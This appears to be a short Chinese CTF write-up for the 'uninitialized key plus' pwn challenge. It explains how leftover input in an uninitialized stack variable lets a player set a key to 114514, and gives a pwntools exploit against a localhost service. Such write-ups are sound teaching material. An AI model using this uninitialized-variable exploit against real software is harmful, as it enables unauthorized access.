# uninitialized key plus

## 文件分析

下载`uninitialized_key_plus`, 保护全开  
ghidra分析为64位程序

## 逆向

和上次一样，使得栈上变量key==114514即可  
使用gdb发送'111122223333444455556666'进行探测（共读入24B），
发现输入无意义字符后key上留下来的值是`'6666'`，故填充前面段，将6666设为114514即可

## EXPLOIT

```python
from pwn import *
sh = remote("localhost", 41675)
sh.sendline(b'0'*20 + p32(114514))
sh.sendline(b'asdfasdf')
sh.interactive()
```

Done.
